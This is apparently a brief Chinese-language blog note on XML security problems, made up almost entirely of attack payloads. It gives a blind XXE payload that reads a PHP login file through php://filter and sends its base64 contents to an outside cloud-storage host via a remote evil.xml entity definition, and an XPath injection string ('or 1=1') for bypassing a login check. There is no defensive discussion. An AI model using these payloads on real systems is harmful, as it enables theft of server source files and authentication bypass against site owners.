---
title: XML相关安全问题
tags: []
id: '593'
categories:
  - - linux
date: 2021-11-01 14:06:43
---

利用payload,盲注

[https://blog.csdn.net/nzjdsds/article/details/98763063](https://blog.csdn.net/nzjdsds/article/details/98763063)
```
<?xml version="1.0"?>

<!DOCTYPE ANY\[

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">

<!ENTITY % remote SYSTEM "https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/evil.xml">

%remote;

%all;

\]>

<user><username>&send;</username><password>aaa</password></user>
```

[https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/evil.xml](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/evil.xml)

```
\[root@Asp blog\]# cat evil.xml

<!ENTITY % all "<!ENTITY send SYSTEM 'https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/1.php?file=%file;'>">
```

xpath注入
```
[https://www.cnblogs.com/backlion/p/8554749.html](https://www.cnblogs.com/backlion/p/8554749.html)

//users/user\[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''=''\]
```